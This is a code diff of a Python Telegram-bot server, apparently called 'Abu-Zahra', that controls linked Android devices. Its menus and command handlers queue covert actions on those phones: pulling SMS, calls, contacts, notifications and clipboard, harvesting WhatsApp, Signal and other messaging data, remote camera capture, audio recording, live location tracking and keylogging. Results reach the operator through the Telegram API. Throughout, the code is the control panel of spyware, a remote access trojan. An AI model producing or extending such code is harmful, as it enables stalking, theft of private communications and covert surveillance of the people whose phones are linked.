+            save_json(COMMANDS_FILE, commands)
+            return commands[i]
+    return None
 
-def get_sessions():
-    return load_json(SESSIONS_FILE, [])
+# ============================================================================
+# SESSION HELPERS
+# ============================================================================
 
-
-def save_sessions(sessions):
-    save_json(SESSIONS_FILE, sessions)
-
-
-def create_session(username: str, password: str) -> dict:
-    sessions = get_sessions()
+def create_session(username, password, ip="", ua=""):
     settings = load_settings()
-    admin_pass = settings.get("admin_password", "admin")
-    if password != admin_pass:
+    if password != settings.get("admin_password", "admin"):
         return None
+    sessions = load_json(SESSIONS_FILE, [])
     token = secrets.token_urlsafe(32)
     session = {
         "token": token,
         "username": username,
         "created_at": datetime.now(timezone.utc).isoformat(),
         "expires_at": (datetime.now(timezone.utc) + timedelta(hours=24)).isoformat(),
-        "ip": "",
-        "user_agent": "",
+        "ip": ip,
+        "user_agent": ua,
     }
     sessions.append(session)
     if len(sessions) > 100:
         sessions = sessions[-100:]
-    save_sessions(sessions)
-    append_event("تسجيل دخول جديد", {"username": username})
+    save_json(SESSIONS_FILE, sessions)
+    append_event("Web login", {"username": username, "ip": ip})
     return session
 
 
-def validate_session(token: str) -> dict:
-    sessions = get_sessions()
+def validate_session(token):
+    sessions = load_json(SESSIONS_FILE, [])
     now = datetime.now(timezone.utc)
-    for i, s in enumerate(sessions):
+    for s in sessions:
         if s.get("token") == token:
-            expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
-            if now > expires:
-                sessions.pop(i)
-                save_sessions(sessions)
+            try:
+                expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
+                if now > expires:
+                    return None
+            except:
                 return None
             return s
     return None
 
 
-def delete_session(token: str):
-    sessions = get_sessions()
+def delete_session(token):
+    sessions = load_json(SESSIONS_FILE, [])
     new_sessions = [s for s in sessions if s.get("token") != token]
-    save_sessions(new_sessions)
+    save_json(SESSIONS_FILE, new_sessions)
 
+# ============================================================================
+# LINK CODE HELPERS
+# ============================================================================
 
-def cleanup_expired_sessions():
-    sessions = get_sessions()
+def generate_link_code():
+    codes = load_json(LINK_CODES_FILE, [])
+    code = secrets.token_urlsafe(6).upper()[:8]
     now = datetime.now(timezone.utc)
-    active = []
-    for s in sessions:
-        expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
-        if now <= expires:
-            active.append(s)
-    save_sessions(active)
+    entry = {
+        "code": code,
+        "created_at": now.isoformat(),
+        "expires_at": (now + timedelta(minutes=10)).isoformat(),
+        "used": False,
+        "device_id": None,
+    }
+    codes.append(entry)
+    if len(codes) > 100:
+        codes = codes[-100:]
+    save_json(LINK_CODES_FILE, codes)
+    append_event("Link code generated", {"code": code})
+    return entry
 
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# Telegram API Helpers
-# ═══════════════════════════════════════════════════════════════════════════════
+def verify_link_code(code):
+    codes = load_json(LINK_CODES_FILE, [])
+    now = datetime.now(timezone.utc)
+    for entry in codes:
+        if entry.get("code") == code and not entry.get("used"):
+            try:
+                expires = datetime.fromisoformat(entry.get("expires_at", "")).replace(tzinfo=timezone.utc)
+                if now > expires:
+                    return {"ok": False, "error": "Code expired"}
+            except:
+                return {"ok": False, "error": "Invalid code"}
+            return {"ok": True, "code_entry": entry}
+    return {"ok": False, "error": "Invalid code"}
 
-def get_tg_session() -> aiohttp.ClientSession:
+
+def consume_link_code(code, device_id):
+    codes = load_json(LINK_CODES_FILE, [])
+    for entry in codes:
+        if entry.get("code") == code:
+            entry["used"] = True
+            entry["device_id"] = device_id
+            entry["used_at"] = datetime.now(timezone.utc).isoformat()
+            save_json(LINK_CODES_FILE, codes)
+            return True
+    return False
+
+# ============================================================================
+# TELEGRAM API HELPERS (aiohttp only)
+# ============================================================================
+
+def get_tg_session():
     global _tg_session
     if _tg_session is None or _tg_session.closed:
         _tg_session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30))
     return _tg_session
 
 
-async def tg_request(method: str, payload: dict = None):
+async def tg_request(method, payload=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
     try:
         session = get_tg_session()
@@ -338,26 +573,39 @@ async def tg_request(method: str, payload: dict = None):
         return None
 
 
-async def send_message(chat_id, text: str, parse_mode: str = "HTML", reply_markup=None):
+async def send_message(chat_id, text, parse_mode="HTML", reply_markup=None, disable_notification=False):
     global messages_sent
-    payload = {
-        "chat_id": chat_id,
-        "text": text,
-        "parse_mode": parse_mode,
-    }
+    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
     if reply_markup:
         payload["reply_markup"] = reply_markup
+    if disable_notification:
+        payload["disable_notification"] = True
     result = await tg_request("sendMessage", payload)
     if result and result.get("ok"):
         messages_sent += 1
     return result
 
 
-async def send_admin(text: str, parse_mode: str = "HTML", reply_markup=None):
+async def send_admin(text, parse_mode="HTML", reply_markup=None):
     return await send_message(ADMIN_CHAT_ID, text, parse_mode, reply_markup)
 
 
-async def answer_callback_query(callback_query_id: str, text: str = "", show_alert: bool = False):
+async def send_photo(chat_id, file_data, caption=None):
+    session = get_tg_session()
+    try:
+        data = aiohttp.FormData()
+        data.add_field("chat_id", str(chat_id))
+        data.add_field("photo", file_data, filename="data.jpg")
+        if caption:
+            data.add_field("caption", caption)
+        async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data=data) as resp:
+            return await resp.json()
+    except Exception as exc:
+        log.error("send_photo failed: %s", exc)
+        return None
+
+
+async def answer_callback_query(callback_query_id, text="", show_alert=False):
     return await tg_request("answerCallbackQuery", {
         "callback_query_id": callback_query_id,
         "text": text,
@@ -365,48 +613,40 @@ async def answer_callback_query(callback_query_id: str, text: str = "", show_ale
     })
 
 
-async def edit_message_text(chat_id, message_id, text: str, parse_mode: str = "HTML", reply_markup=None):
-    payload = {
-        "chat_id": chat_id,
-        "message_id": message_id,
-        "text": text,
-        "parse_mode": parse_mode,
-    }
+async def edit_message_text(chat_id, message_id, text, parse_mode="HTML", reply_markup=None):
+    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
     if reply_markup:
         payload["reply_markup"] = reply_markup
     return await tg_request("editMessageText", payload)
 
+# ============================================================================
+# INLINE KEYBOARD BUILDERS
+# ============================================================================
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# Inline Keyboard Builders
-# ═══════════════════════════════════════════════════════════════════════════════
-
-def inline_button(text, callback_data):
+def ib(text, callback_data):
     return {"text": text, "callback_data": callback_data}
-
-
-def inline_row(*buttons):
-    return list(buttons)
 
 
 def build_main_menu():
     return {
         "inline_keyboard": [
-            [inline_button("📱 الأجهزة", "menu_devices")],
-            [inline_button("📊 جمع البيانات", "menu_data")],
-            [inline_button("🌐 الشبكات الاجتماعية", "menu_social")],
-            [inline_button("🎮 التحكم عن بعد", "menu_control")],
-            [inline_button("📍 الموقع الجغرافي", "menu_location")],
-            [inline_button("⚙️ إدارة التطبيقات", "menu_apps")],
-            [inline_button("🔧 الإعدادات", "menu_settings")],
-            [inline_button("🔍 المراقبة", "menu_monitor")],
-            [inline_button("🖥️ الخادم", "menu_server")],
+            [ib("📱 Devices & Link", "menu_devices")],
+            [ib("📊 Data Collection", "menu_data")],
+            [ib("🌐 Social Media", "menu_social")],
+            [ib("🎮 Remote Control", "menu_control")],
+            [ib("📦 App Management", "menu_apps")],
+            [ib("📂 File Management", "menu_files")],
+            [ib("🔒 Security & Admin", "menu_security")],
+            [ib("🔍 Monitoring", "menu_monitor")],
+            [ib("⚙️ System Settings", "menu_syssettings")],
+            [ib("🖥️ Server Management", "menu_server")],
+            [ib("⁉️ Help", "menu_help")],
         ]
     }
 
 
-def build_back_menu():
-    return {"inline_keyboard": [[inline_button("🔙 الرجوع للقائمة الرئيسية", "back_main")]]}
+def build_back_button(target="back_main"):
+    return {"inline_keyboard": [[ib("🔙 Back", target)]]}
 
 
 def build_devices_menu():
@@ -414,2077 +654,1713 @@ def build_devices_menu():
     rows = []
     for d in devices:
         status = "🟢" if d.get("active") else "🔴"
-        name = d.get("name", d.get("id", "غير معروف"))
-        rows.append([inline_button(f"{status} {name} ({d['id']})", f"dev_{d['id']}")])
+        name = d.get("name", d.get("id", "Unknown"))
+        rows.append([ib(f"{status} {name}", f"dev_{d['id']}")])
     if not devices:
-        rows.append([inline_button("لا توجد أجهزة", "no_action")])
-    rows.append([inline_button("🔗 ربط جهاز جديد", "cmd_link")])
-    rows.append([inline_button("🔙 الرجوع", "back_main")])
+        rows.append([ib("No devices linked", "no_action")])
+    rows.append([ib("🔗 Link New Device", "do_link")])
+    rows.append([ib("🔙 Back", "back_main")])
     return {"inline_keyboard": rows}
 
 
 def build_device_menu(device_id):
     return {
         "inline_keyboard": [
-            [inline_button("ℹ️ معلومات الجهاز", f"cmd_info_{device_id}")],
-            [inline_button("🔋 البطارية", f"cmd_battery_{device_id}"),
-             inline_button("📍 الموقع", f"cmd_location_{device_id}")],
-            [inline_button("📲 الرسائل", f"cmd_sms_{device_id}"),
-             inline_button("📞 المكالمات", f"cmd_calls_{device_id}")],
-            [inline_button("📇 جهات الاتصال", f"cmd_contacts_{device_id}"),
-             inline_button("🔔 الإشعارات", f"cmd_notifications_{device_id}")],
-            [inline_button("📸 لقطات الشاشة", f"cmd_screenshot_{device_id}"),
-             inline_button("📷 الكاميرا", f"cmd_camera_{device_id}")],
-            [inline_button("📋 الحافظة", f"cmd_clipboard_{device_id}"),
-             inline_button("📲 التطبيقات", f"cmd_apps_{device_id}")],
-            [inline_button("🌐 الشبكات الاجتماعية", f"social_{device_id}")],
-            [inline_button("🎮 التحكم", f"control_{device_id}")],
-            [inline_button("🗑️ حذف الجهاز", f"unlink_{device_id}")],
-            [inline_button("🔙 الرجوع للأجهزة", "menu_devices")],
+            [ib("ℹ️ Device Info", f"cmd_info_{device_id}")],
+            [ib("🔋 Battery", f"cmd_battery_{device_id}"), ib("📍 Location", f"cmd_location_{device_id}")],
+            [ib("📲 SMS", f"cmd_sms_{device_id}"), ib("📞 Calls", f"cmd_calls_{device_id}")],
+            [ib("📇 Contacts", f"cmd_contacts_{device_id}"), ib("🔔 Notifications", f"cmd_notifications_{device_id}")],
+            [ib("📸 Screenshot", f"cmd_screenshot_{device_id}"), ib("📷 Camera", f"submenu_camera_{device_id}")],
+            [ib("📋 Clipboard", f"cmd_clipboard_{device_id}"), ib("📱 Apps", f"cmd_apps_{device_id}")],
+            [ib("🌐 Social", f"submenu_social_{device_id}")],
+            [ib("🎮 Control", f"submenu_control_{device_id}")],
+            [ib("📂 Files", f"submenu_files_{device_id}")],
+            [ib("🔒 Security", f"submenu_security_{device_id}")],
+            [ib("🔍 Monitor", f"submenu_monitor_{device_id}")],
+            [ib("⚙️ Settings", f"submenu_syssettings_{device_id}")],
+            [ib("🗑️ Unlink", f"do_unlink_{device_id}")],
+            [ib("🔙 Back", "menu_devices")],
         ]
     }
 
 
-def build_data_menu(device_id):
-    if not device_id:
-        d = get_first_device()
-        device_id = d["id"] if d else "none"
-    return {
-        "inline_keyboard": [
-            [inline_button("📲 الرسائل SMS", f"cmd_sms_{device_id}")],
-            [inline_button("📞 سجل المكالمات", f"cmd_calls_{device_id}")],
-            [inline_button("📇 جهات الاتصال", f"cmd_contacts_{device_id}")],
-            [inline_button("📍 الموقع الجغرافي", f"cmd_location_{device_id}")],
-            [inline_button("🔔 الإشعارات", f"cmd_notifications_{device_id}")],
-            [inline_button("📱 التطبيقات المثبتة", f"cmd_apps_{device_id}")],
-            [inline_button("ℹ️ معلومات الجهاز", f"cmd_info_{device_id}")],
-            [inline_button("🔋 حالة البطارية", f"cmd_battery_{device_id}")],
-            [inline_button("🖼️ المعرض", f"cmd_gallery_{device_id}")],
-            [inline_button("📋 الحافظة", f"cmd_clipboard_{device_id}")],
-            [inline_button("📥 جميع البيانات", f"cmd_all_{device_id}")],
-            [inline_button("🔙 الرجوع", "back_main")],
-        ]
-    }
+def build_category_submenu(device_id, category):
+    """Build submenu for a command category with paginated buttons."""
+    items = []
+    for name, info in COMMAND_REGISTRY.items():
+        if info["cat"] == category:
+            items.append((name, info))
+    
+    if not items:
+        return build_back_button(f"dev_{device_id}")
+    
+    rows = []
+    # Paginate: 6 buttons per page, display in 2 columns
+    page_size = 10
+    chunked = [items[i:i+page_size] for i in range(0, len(items), page_size)]
+    
+    for chunk in chunked[0]:  # First page
+        rows.append([ib(f"{info['desc']}", f"exec_{name}_{device_id}") for name, info in [chunk]])
+    
+    # Simplified: just list all
+    rows = []
+    for name, info in items:
+        rows.append([ib(info["desc"], f"exec_{name}_{device_id}")])
+    
+    rows.append([ib("🔙 Back", f"dev_{device_id}")])
+    return {"inline_keyboard": rows}
 
 
-def build_social_menu(device_id):
-    if not device_id:
-        d = get_first_device()
-        device_id = d["id"] if d else "none"
-    return {
-        "inline_keyboard": [
-            [inline_button("💬 واتساب", f"cmd_whatsapp_{device_id}")],
-            [inline_button("✈️ تليجرام", f"cmd_telegram_{device_id}")],
-            [inline_button("📷 انستجرام", f"cmd_instagram_{device_id}")],
-            [inline_button("🔵 ماسنجر", f"cmd_messenger_{device_id}")],
-            [inline_button("👻 سناب شات", f"cmd_snapchat_{device_id}")],
-            [inline_button("🎵 تيك توك", f"cmd_tiktok_{device_id}")],
-            [inline_button("🐦 تويتر", f"cmd_twitter_{device_id}")],
-            [inline_button("💜 فايبر", f"cmd_viber_{device_id}")],
-            [inline_button("🔵 سيجنال", f"cmd_signal_{device_id}")],
-            [inline_button("🔙 الرجوع", "back_main")],
-        ]
-    }
+def build_data_submenu(device_id):
+    return build_category_submenu(device_id, "data")
 
 
-def build_control_menu(device_id):
-    if not device_id:
-        d = get_first_device()
-        device_id = d["id"] if d else "none"
-    return {
-        "inline_keyboard": [
-            [inline_button("📡 فحص الاتصال", f"cmd_ping_{device_id}")],
-            [inline_button("📳 اهتزاز", f"cmd_vibrate_{device_id}")],
-            [inline_button("🔔 رنين", f"cmd_ring_{device_id}")],
-            [inline_button("📸 لقطة شاشة", f"cmd_screenshot_{device_id}")],
-            [inline_button("📷 كاميرا أمامية", f"cmd_front_camera_{device_id}")],
-            [inline_button("📷 كاميرا خلفية", f"cmd_back_camera_{device_id}")],
-            [inline_button("🎙️ تسجيل صوت", f"cmd_record_audio_{device_id}")],
-            [inline_button("🔦 تشغيل الفلاش", f"cmd_flash_on_{device_id}")],
-            [inline_button("🔦 إطفاء الفلاش", f"cmd_flash_off_{device_id}")],
-            [inline_button("🔙 الرجوع", "back_main")],
-        ]
-    }
+def build_social_submenu(device_id):
+    return build_category_submenu(device_id, "social")
 
 
-def build_camera_menu(device_id):
-    return {
-        "inline_keyboard": [
-            [inline_button("📷 كاميرا أمامية", f"cmd_front_camera_{device_id}")],
-            [inline_button("📷 كاميرا خلفية", f"cmd_back_camera_{device_id}")],
-            [inline_button("🔙 الرجوع", f"control_{device_id}")],
-        ]
-    }
+def build_control_submenu(device_id):
+    return build_category_submenu(device_id, "control")
 
 
-def build_location_menu(device_id):
-    if not device_id:
-        d = get_first_device()
-        device_id = d["id"] if d else "none"
-    return {
-        "inline_keyboard": [
-            [inline_button("📍 الموقع الحالي", f"cmd_location_{device_id}")],
-            [inline_button("🗺️ تتبع مباشر", f"cmd_location_live_{device_id}")],
-            [inline_button("⏹️ إيقاف التتبع", f"cmd_location_stop_{device_id}")],
-            [inline_button("📜 سجل المواقع", f"cmd_location_history_{device_id}")],
-            [inline_button("🎮 المناطق الجغرافية", "cmd_geo_fence")],
-            [inline_button("🔙 الرجوع", "back_main")],
-        ]
-    }
+def build_apps_submenu(device_id):
+    return build_category_submenu(device_id, "apps")
 
 
-def build_apps_menu(device_id):
-    if not device_id:
-        d = get_first_device()
-        device_id = d["id"] if d else "none"
-    return {
-        "inline_keyboard": [
-            [inline_button("📱 التطبيقات المثبتة", f"cmd_apps_{device_id}")],
-            [inline_button("📊 استخدام التطبيقات", f"cmd_app_usage_{device_id}")],
-            [inline_button("⏱️ وقت الشاشة", f"cmd_screen_time_{device_id}")],
-            [inline_button("🔙 الرجوع", "back_main")],
-        ]
-    }
+def build_files_submenu(device_id):
+    return build_category_submenu(device_id, "files")
 
 
-def build_settings_menu():
-    return {
-        "inline_keyboard": [
-            [inline_button("⏱️ فترة المزامنة", "cmd_set_interval")],
-            [inline_button("📍 فترة الموقع", "cmd_set_location_interval")],
-            [inline_button("🗺️ الموقع التلقائي", "cmd_auto_location")],
-            [inline_button("🔄 المزامنة التلقائية", "cmd_auto_sync")],
-            [inline_button("🌐 اللغة", "cmd_language")],
-            [inline_button("🔔 الإشعارات", "cmd_notify")],
-            [inline_button("🔙 الرجوع", "back_main")],
-        ]
-    }
+def build_security_submenu(device_id):
+    return build_category_submenu(device_id, "security")
 
 
-def build_monitor_menu(device_id):
-    if not device_id:
-        d = get_first_device()
-        device_id = d["id"] if d else "none"
-    return {
-        "inline_keyboard": [
-            [inline_button("⌨️ تسجيل المفاتيح", f"cmd_keylogger_{device_id}")],
-            [inline_button("📥 بيانات المفاتيح", f"cmd_keylogger_get_{device_id}")],
-            [inline_button("📡 كشف تغيير الشريحة", f"cmd_sim_detect_{device_id}")],
-            [inline_button("📶 مراقبة الواي فاي", f"cmd_wifi_monitor_{device_id}")],
-            [inline_button("🔙 الرجوع", "back_main")],
-        ]
-    }
+def build_monitor_submenu(device_id):
+    return build_category_submenu(device_id, "monitor")
+
+
+def build_syssettings_submenu(device_id):
+    return build_category_submenu(device_id, "syssettings")
 
 
 def build_server_menu():
     return {
         "inline_keyboard": [
-            [inline_button("📊 حالة الخادم", "cmd_server_status")],
-            [inline_button("🔄 إعادة تشغيل", "cmd_server_restart")],
-            [inline_button("🗑️ مسح البيانات", "cmd_clear_data")],
-            [inline_button("💾 نسخ احتياطي", "cmd_backup")],
-            [inline_button("📤 تصدير البيانات", "cmd_export")],
-            [inline_button("📈 الإحصائيات", "cmd_stats")],
-            [inline_button("🔙 الرجوع", "back_main")],
+            [ib("📊 Server Status", "srv_status")],
+            [ib("📈 Statistics", "srv_stats")],
+            [ib("📝 Event Logs", "srv_logs")],
+            [ib("⚙️ Settings", "srv_settings")],
+            [ib("🔑 Set Password", "srv_setpass")],
+            [ib("➕ Add Admin", "srv_addadmin")],
+            [ib("📢 Broadcast", "srv_broadcast")],
+            [ib("💾 Backup", "srv_backup")],
+            [ib("📤 Export", "srv_export")],
+            [ib("📥 Import", "srv_import")],
+            [ib("🗑️ Clear Data", "srv_cleardata")],
+            [ib("🔄 Restart", "srv_restart")],
+            [ib("🔧 Maintenance", "srv_maintenance")],
+            [ib("🔙 Back", "back_main")],
         ]
     }
 
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# Telegram Command Handlers
-# ═══════════════════════════════════════════════════════════════════════════════
+def build_help_menu():
+    total = len(COMMAND_REGISTRY)
+    cats = OrderedDict()
+    for name, info in COMMAND_REGISTRY.items():
+        cat = info["cat"]
+        if cat not in cats:
+            cats[cat] = []
+        cats[cat].append(info)
+    
+    text = f"📖 <b>Command Guide - Abu Zahra</b>\n\nTotal: <b>{total}</b> commands\n\n"
+    cat_names = {
+        "data": "📊 Data Collection", "social": "🌐 Social Media",
+        "control": "🎮 Remote Control", "apps": "📦 App Management",
+        "files": "📂 File Management", "security": "🔒 Security",
+        "monitor": "🔍 Monitoring", "syssettings": "⚙️ System Settings",
+    }
+    for cat, items in cats.items():
+        text += f"<b>{cat_names.get(cat, cat)}</b> ({len(items)}):\n"
+        for item in items[:3]:
+            text += f"  /{item['cmd'].replace('get_','').replace('cmd_','')}\n"
+        if len(items) > 3:
+            text += f"  ...+{len(items)-3} more\n"
+        text += "\n"
+    
+    text += "📱 /devices - Device list\n🔗 /link - Link device\n"
+    text += "📋 /menu - Main menu\n📊 /status - Status\n"
+    return text
 
-async def cmd_start(chat_id):
-    text = (
-        "🟥 <b>أبو زهرة - خادم الإدارة</b>\n\n"
-        "مرحباً بك في لوحة التحكم الشاملة\n"
-        "يمكنك إدارة جميع الأجهزة والتحكم بها\n\n"
-        f"🟢 الخادم يعمل منذ: <code>{format_uptime(uptime())}</code>\n"
-        f"📱 عدد الأجهزة: <code>{len(get_devices())}</code>\n"
-        f"📡 المنفذ: <code>{SERVER_PORT}</code>"
-    )
-    await send_message(chat_id, text, reply_markup=build_main_menu())
+# ============================================================================
+# COMMAND EXECUTOR
+# ============================================================================
 
-
-async def cmd_help(chat_id):
-    text = (
-        "📖 <b>دليل الأوامر - أبو زهرة</b>\n\n"
-        "📋 <b>الأوامر الأساسية:</b>\n"
-        "/start - القائمة الرئيسية\n"
-        "/help - عرض المساعدة\n"
-        "/status - حالة البوت\n"
-        "/devices - قائمة الأجهزة\n\n"
-        "📱 <b>أوامر الأجهزة:</b>\n"
-        "/link - ربط جهاز جديد\n"
-        "/device [id] - تفاصيل جهاز\n"
-        "/unlink [id] - فصل جهاز\n\n"
-        "📊 <b>جمع البيانات:</b>\n"
-        "/sms [id] - الرسائل\n"
-        "/calls [id] - المكالمات\n"
-        "/contacts [id] - جهات الاتصال\n"
-        "/location [id] - الموقع\n"
-        "/notifications [id] - الإشعارات\n"
-        "/apps [id] - التطبيقات\n"
-        "/all [id] - جميع البيانات\n\n"
-        "🎮 <b>التحكم عن بعد:</b>\n"
-        "/ping [id] - فحص الاتصال\n"
-        "/vibrate [id] - اهتزاز\n"
-        "/ring [id] - رنين\n"
-        "/screenshot [id] - لقطة شاشة\n\n"
-        "🔧 <b>لمزيد من الأوامر استخدم القائمة:</b>\n"
-        "/menu"
-    )
-    await send_message(chat_id, text, reply_markup=build_back_menu())
-
-
-async def cmd_status(chat_id):
-    devices = get_devices()
-    online = sum(1 for d in devices if d.get("active"))
-    events = load_json(EVENTS_FILE, [])
-    commands = load_json(COMMANDS_FILE, [])
-    pending = sum(1 for c in commands if c.get("status") == "pending")
-    text = (
-        "📊 <b>حالة البوت والخادم</b>\n\n"
-        f"🟢 الحالة: <code>يعمل</code>\n"
-        f"⏱️ وقت التشغيل: <code>{format_uptime(uptime())}</code>\n"
-        f"📡 المنفذ: <code>{SERVER_PORT}</code>\n"
-        f"🕐 الوقت: <code>{ts()}</code>\n\n"
-        f"📱 الأجهزة: <code>{len(devices)}</code> (🟢 {online} متصل)\n"
-        f"📨 الرسائل المرسلة: <code>{messages_sent}</code>\n"
-        f"📋 الأوامر المعلقة: <code>{pending}</code>\n"
-        f"📝 الأحداث: <code>{len(events)}</code>"
-    )
-    await send_message(chat_id, text, reply_markup=build_back_menu())
-
-
-async def cmd_devices(chat_id):
-    devices = get_devices()
-    if not devices:
-        await send_message(chat_id, "📱 لا توجد أجهزة مسجلة\nاستخدم /link لربط جهاز جديد", reply_markup=build_back_menu())
-        return
-    text = "📱 <b>قائمة الأجهزة</b>\n\n"
-    for d in devices:
-        status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
-        name = d.get("name", d.get("model", "غير معروف"))
-        text += (
-            f"{'━'*20}\n"
-            f"📱 <b>{name}</b>\n"
-            f"   المعرف: <code>{d['id']}</code>\n"
-            f"   الحالة: {status}\n"
-            f"   آخر نشاط: <code>{d.get('last_seen', '—')}</code>\n"
-        )
-    await send_message(chat_id, text, reply_markup=build_devices_menu())
-
-
-async def cmd_link(chat_id):
-    code = secrets.token_urlsafe(6).upper()[:8]
-    settings = load_settings()
-    settings["link_code"] = code
-    settings["link_code_expires"] = (datetime.now(timezone.utc) + timedelta(minutes=10)).isoformat()
-    save_settings(settings)
-    text = (
-        "🔗 <b>ربط جهاز جديد</b>\n\n"
-        f"🔑 كود الربط: <code>{code}</code>\n\n"
-        "أدخل هذا الكود في تطبيق Android\n"
-        "⏱️ صالح لمدة 10 دقائق\n\n"
-        "سيتم إشعارك عند نجاح الربط"
-    )
-    append_event("إنشاء كود ربط", {"code": code})
-    await send_message(chat_id, text, reply_markup=build_back_menu())
-
-
-async def cmd_unlink(chat_id, device_id):
-    if not device_id:
-        await send_message(chat_id, "❌ المعرف مطلوب\nالاستخدام: /unlink device_id", reply_markup=build_back_menu())
-        return
-    if remove_device(device_id):
-        append_event("فصل جهاز", {"id": device_id})
-        await send_message(chat_id, f"✅ تم فصل الجهاز <code>{device_id}</code>", reply_markup=build_devices_menu())
-    else:
-        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود", reply_markup=build_back_menu())
-
-
-async def cmd_device(chat_id, device_id):
-    if not device_id:
-        await send_message(chat_id, "❌ المعرف مطلوب\nالاستخدام: /device device_id", reply_markup=build_back_menu())
-        return
-    d = find_device(device_id)
-    if not d:
-        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود", reply_markup=build_back_menu())
-        return
-    status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
-    text = (
-        f"📱 <b>تفاصيل الجهاز</b>\n\n"
-        f"{'━'*20}\n"
-        f"📱 الاسم: <code>{d.get('name', '—')}</code>\n"
-        f"🆔 المعرف: <code>{d['id']}</code>\n"
-        f"📊 الحالة: {status}\n"
-        f"📱 الموديل: <code>{d.get('model', '—')}</code>\n"
-        f"🤖 النظام: <code>{d.get('os', '—')}</code>\n"
-        f"🔋 البطارية: <code>{d.get('battery', '—')}%</code>\n"
-        f"📶 الشبكة: <code>{d.get('network', '—')}</code>\n"
-        f"📍 الموقع: <code>{d.get('location', '—')}</code>\n"
-        f"🕐 آخر نشاط: <code>{d.get('last_seen', '—')}</code>\n"
-        f"📅 تاريخ التسجيل: <code>{d.get('created_at', '—')}</code>\n"
-    )
-    extra = d.get("extra", {})
-    if extra:
-        text += f"\n📋 معلومات إضافية: <code>{json.dumps(extra, ensure_ascii=False)[:200]}</code>"
-    await send_message(chat_id, text, reply_markup=build_device_menu(device_id))
-
-
-async def send_device_command(chat_id, device_id, command_name, display_name):
+async def execute_device_command(chat_id, device_id, cmd_name, params=None, msg_id=None):
+    """Queue a command for a device and notify admin."""
     if not device_id or device_id == "none":
-        await send_message(chat_id, "❌ لا يوجد جهاز. استخدم /link لربط جهاز.", reply_markup=build_back_menu())
+        await send_message(chat_id, "❌ No device selected. Use /link first.", reply_markup=build_main_menu())
         return
+    
     d = find_device(device_id)
     if not d:
-        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود", reply_markup=build_back_menu())
+        await send_message(chat_id, f"❌ Device <code>{device_id}</code> not found.", reply_markup=build_main_menu())
         return
-    cmd = queue_command(device_id, command_name)
+    
+    cmd = queue_command(device_id, cmd_name, params)
+    reg = COMMAND_REGISTRY.get(cmd_name, {})
+    desc = reg.get("desc", cmd_name)
+    emoji = reg.get("emoji", "📋")
+    
     text = (
-        f"📤 <b>{display_name}</b>\n\n"
-        f"📱 الجهاز: <code>{d.get('name', device_id)}</code>\n"
-        f"📋 الأمر: <code>{command_name}</code>\n"
-        f"🆔 معرف الأمر: <code>{cmd['id']}</code>\n\n"
-        f"⏳ في انتظار استجابة الجهاز..."
+        f"{emoji} <b>Command Sent</b>\n\n"
+        f"📱 Device: <code>{d.get('name', device_id)}</code>\n"
+        f"📋 Command: <code>{cmd_name}</code>\n"
+        f"🆔 ID: <code>{cmd['id']}</code>\n\n"
+        f"⏳ Waiting for device response..."
     )
-    await send_message(chat_id, text, reply_markup=build_device_menu(device_id))
+    
+    kb = build_device_menu(device_id)
+    
+    if msg_id:
+        await edit_message_text(chat_id, msg_id, text, reply_markup=kb)
+    else:
+        await send_message(chat_id, text, reply_markup=kb)
 
+# ============================================================================
+# TELEGRAM COMMAND HANDLER
+# ============================================================================
 
-async def handle_command(chat_id, text: str):
-    parts = text.strip().split(maxsplit=2)
+async def handle_telegram_command(chat_id, text, message_id=None):
+    parts = text.strip().split(maxsplit=3)
     cmd = parts[0].lower()
     args = parts[1:] if len(parts) > 1 else []
     arg1 = args[0] if args else ""
     arg2 = args[1] if len(args) > 1 else ""
 
-    if not arg1:
+    # Resolve device_id
+    dev_id = arg1
+    if not dev_id or not find_device(dev_id):
         d = get_first_device()
         dev_id = d["id"] if d else ""
-    else:
-        dev_id = arg1
 
-    log.info("CMD from %s: %s args=%s", chat_id, cmd, args)
-    append_event("أمر تليجرام", {"command": cmd, "args": args})
+    log.info("CMD %s from %s: %s", cmd, chat_id, args)
+    append_event("Telegram command", {"command": cmd, "args": args})
 
-    # ── Basic Commands ──
+    # ── Utility Commands ──
     if cmd == "/start":
-        await cmd_start(chat_id)
+        await handle_start(chat_id)
     elif cmd == "/help":
-        await cmd_help(chat_id)
+        text = build_help_menu()
+        await send_message(chat_id, text, reply_markup=build_back_button())
     elif cmd == "/menu":
-        text = "📋 <b>القائمة الرئيسية</b>\nاختر أحد الأقسام:"
-        await send_message(chat_id, text, reply_markup=build_main_menu())
+        await send_message(chat_id, "📋 <b>Main Menu</b>\nSelect a category:", reply_markup=build_main_menu())
     elif cmd == "/status":
-        await cmd_status(chat_id)
+        await handle_status(chat_id)
+    elif cmd == "/about":
+        await send_message(chat_id, (
+            "🟥 <b>Abu-Zahra Server v3.0</b>\n\n"
+            "Complete Device Management System\n"
+            f"Domain: <code>{SERVER_DOMAIN}</code>\n"
+            f"Port: <code>{SERVER_PORT}</code>\n"
+            f"Commands: <code>{len(COMMAND_REGISTRY)}</code>\n"
+            f"Uptime: <code>{format_uptime(get_uptime())}</code>"
+        ), reply_markup=build_back_button())
+    elif cmd == "/version":
+        await send_message(chat_id, "🟥 <b>Abu-Zahra v3.0</b>\nBuild: 2025.01\nCommands: 200+\nEngine: aiohttp", reply_markup=build_back_button())
+    elif cmd == "/test":
+        await send_message(chat_id, "✅ Server is running!\n🟢 All systems operational.", reply_markup=build_back_button())
 
-    # ── Device Commands ──
-    elif cmd == "/devices" or cmd == "/devices_list":
-        await cmd_devices(chat_id)
+    # ── Device Management ──
+    elif cmd == "/devices":
